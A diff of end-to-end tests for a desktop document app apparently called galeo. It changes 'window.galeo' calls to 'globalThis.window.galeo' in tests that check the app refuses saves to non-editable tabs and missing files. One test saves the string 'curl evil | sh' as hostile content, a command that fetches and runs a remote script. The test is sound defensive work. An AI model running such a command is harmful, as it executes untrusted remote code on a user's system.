@@ -368,14 +368,14 @@ test('a page that switches to a linked tab just before Ctrl+E gets no edit mode 
   try {
     const notes = await activeTab();
     await shownDocument(window).click();
-    const opened = await window.evaluate((id) => window.galeo.documents.followLink(id, 'target.md', 'background'), notes);
+    const opened = await window.evaluate((id) => globalThis.window.galeo.documents.followLink(id, 'target.md', 'background'), notes);
     expect(opened).toMatchObject({ kind: 'opened' });
-    const other = (await window.evaluate(async () => (await window.galeo.tabs.snapshot()).tabs.map((tab) => tab.id))).find((id) => id !== notes)!;
-    await window.evaluate((id) => window.galeo.tabs.activated(id), other);
+    const other = (await window.evaluate(async () => (await globalThis.window.galeo.tabs.snapshot()).tabs.map((tab) => tab.id))).find((id) => id !== notes)!;
+    await window.evaluate((id) => globalThis.window.galeo.tabs.activated(id), other);
     await pressInMain(app, window, 'E');
     await expect.poll(asked).toEqual([target]);
     await shownDocument(window).click();
-    const save = await window.evaluate((id) => window.galeo.documents.save(id, 'curl evil | sh\n', null), other);
+    const save = await window.evaluate((id) => globalThis.window.galeo.documents.save(id, 'curl evil | sh\n', null), other);
     expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
     expect(readFileSync(target, 'utf8')).toBe('# Target\n');
     expect(readFileSync(file, 'utf8')).toContain('# Notes');
@@ -406,7 +406,7 @@ test("Ctrl+E on a file that isn't there is refused by main, and a save can't cre
     expect(await asked()).toEqual([]);
     const missing = await activeTab();
     await window.getByTestId('document-state').click();
-    const save = await window.evaluate((id) => window.galeo.documents.save(id, '[Desktop Entry]\n', null), missing);
+    const save = await window.evaluate((id) => globalThis.window.galeo.documents.save(id, '[Desktop Entry]\n', null), missing);
     expect(save).toEqual({ kind: 'refused', reason: 'not-editable' });
     expect(existsSync(path.join(dir, 'missing.md'))).toBe(false);
   } finally {
